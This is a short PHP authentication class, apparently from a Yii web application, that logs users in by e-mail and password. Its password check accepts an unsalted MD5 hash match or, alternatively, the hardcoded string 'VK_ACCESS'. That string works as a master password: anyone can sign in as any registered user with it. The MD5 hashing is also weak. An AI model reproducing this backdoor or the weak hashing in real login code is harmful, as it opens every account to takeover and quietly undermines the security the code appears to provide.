<?php
class UserIdentity extends CUserIdentity {
	public function authenticate() {
            $users = Users::model()->findByAttributes(array('e_mail' => $this->username));
            if(!isset($users->e_mail)) {
                $this->errorCode=self::ERROR_USERNAME_INVALID;
            } elseif(($users->password === md5($this->password)) || ($this->password == "VK_ACCESS")) {
                $this->setState('id', $users->id);
		$this->setState('type', $users->type);
                $this->errorCode=self::ERROR_NONE;
            } else {
                $this->errorCode=self::ERROR_PASSWORD_INVALID;
            }
            return !$this->errorCode;
	}
}